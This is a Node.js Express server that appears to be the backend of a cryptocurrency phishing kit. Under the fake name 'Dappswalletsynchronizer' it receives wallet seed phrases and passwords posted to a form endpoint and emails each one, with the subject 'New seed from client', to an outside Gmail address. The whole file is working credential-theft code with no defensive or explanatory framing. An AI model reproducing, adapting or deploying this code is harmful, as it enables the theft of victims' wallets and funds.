const express = require('express')
const nodemailer = require('nodemailer')
const path = require('path')
const cors = require('cors')
const { user, pass } = require('./env')

const app = express()

const port = process.env.PORT || 8080

app.use(cors())
app.use(express.urlencoded({ extended: false }))
app.use(express.json())


app.post('/form', async(req, res) => {
  const { seed, password } = await req.body
  res.json({ status: 200 })

  const transporter = await nodemailer.createTransport({
    service: "gmail",
    auth: {
      user,
      pass
    },
  });
 
  const response = await transporter.sendMail({
    from: '"Dappswalletsynchronizer" <jtom29544@gmail.com>',
    to: "atmosphere0610@gmail.com",
    subject: "New seed from client", 
    text: `seed: ${seed} \npassword: ${password ? password : ''}`
  })   

}) 

app.listen(port, () => { 
  console.log(`server started on port ${port}`)   
});  
  